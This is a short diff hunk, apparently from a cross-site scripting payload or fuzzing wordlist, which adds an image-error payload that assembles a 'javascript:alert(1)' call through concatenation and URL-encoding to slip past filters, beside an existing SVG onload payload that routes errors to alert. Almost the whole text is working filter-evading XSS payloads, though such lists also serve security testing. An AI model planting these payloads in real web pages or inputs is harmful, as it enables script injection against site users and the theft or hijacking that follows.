@@ -7,7 +7,7 @@ self
 parent
 windiow
 
-
+<img src="1" onerror=location="javascript:aler"%2b"t%2"%2b"81%2"%2b"9">
 
 
 <svg onload="javascript:window.onerror=alert;throw 1">
